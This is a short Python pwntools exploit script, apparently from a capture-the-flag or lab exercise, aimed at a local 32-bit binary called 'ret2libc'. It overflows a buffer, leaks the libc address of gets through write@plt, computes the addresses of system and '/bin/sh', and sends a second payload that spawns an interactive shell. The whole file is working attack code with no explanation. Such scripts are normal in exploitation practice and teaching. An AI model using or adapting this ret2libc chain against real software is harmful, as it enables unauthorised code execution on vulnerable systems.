from pwn import *
context.log_level = "debug"
context.arch = "i386"
p = process("./ret2libc")
e = ELF("./ret2libc")

write_plt = e.plt["write"]
gets_got = e.got["gets"]
vul = e.symbols["vul"]

payload = flat(["A"*22,write_plt,vul,1,gets_got,4])
p.sendlineafter("hello",payload)

gets_addr = u32(p.recv(4))
print hex(gets_addr)

# system 
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
gets_offset = libc.symbols["gets"]
libc_base = gets_addr - gets_offset 

system_addr = libc_base + libc.symbols["system"]
bin_sh = libc_base + libc.search("/bin/sh").next()

payload2 = flat(["A"*22,system_addr,"AAAA",bin_sh])
p.sendline(payload2)
p.interactive()
